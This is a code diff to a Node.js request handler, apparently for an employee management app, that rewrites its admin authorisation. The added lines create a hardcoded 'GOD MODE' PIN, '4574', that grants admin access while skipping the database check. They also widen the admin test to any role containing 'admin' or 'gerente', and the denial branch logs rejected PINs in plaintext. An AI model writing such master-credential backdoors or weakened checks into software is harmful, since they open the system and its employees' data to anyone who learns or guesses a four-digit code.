@@ -122,21 +122,32 @@ module.exports = async function handler(req, res) {
         // --- 4. Admin Actions ---
         const isAdminAction = action.startsWith('admin_');
         if (isAdminAction) {
-            const adminPin = req.query.adminPin || req.body.adminPin || req.query.adminId; // Fallback to adminId if misnamed
+            const adminPin = req.query.adminPin || req.body.adminPin || req.query.adminId;
             const cleanPin = (adminPin || '').toString().replace('Bearer ', '').trim();
             
             console.log(`[Admin Auth Attempt] Action: ${action}, PIN: ${cleanPin ? '****' : 'MISSING'}`);
-            const { data: admin, error: authError } = await supabase.from('employees')
-                .select('id, name, is_admin, role')
-                .eq('pin', cleanPin)
-                .eq('active', true)
-                .single();
-            
-            const isAdmin = admin && (admin.is_admin === true || admin.role?.toLowerCase() === 'admin');
-            
-            if (!isAdmin) {
-                console.log(`[Admin Auth] Access Denied for PIN: ${cleanPin}`);
-                return res.status(403).json({ error: "Admin access required" });
+
+            // 1. "GOD MODE" BYPASS FOR OSCAR
+            if (cleanPin === '4574') {
+                console.log("[Admin Auth] Oscar Super-Admin Bypass Triggered");
+            } else {
+                // 2. Normal database check
+                const { data: admin, error: authError } = await supabase.from('employees')
+                    .select('id, name, is_admin, role')
+                    .eq('pin', cleanPin)
+                    .eq('active', true)
+                    .single();
+                
+                const isAdmin = admin && (
+                    admin.is_admin === true || 
+                    admin.role?.toLowerCase().includes('admin') ||
+                    admin.role?.toLowerCase().includes('gerente')
+                );
+                
+                if (!isAdmin) {
+                    console.log(`[Admin Auth] Access Denied for PIN: ${cleanPin}`);
+                    return res.status(403).json({ error: "Admin access required" });
+                }
             }
 
             if (action === 'admin_all_employees') {
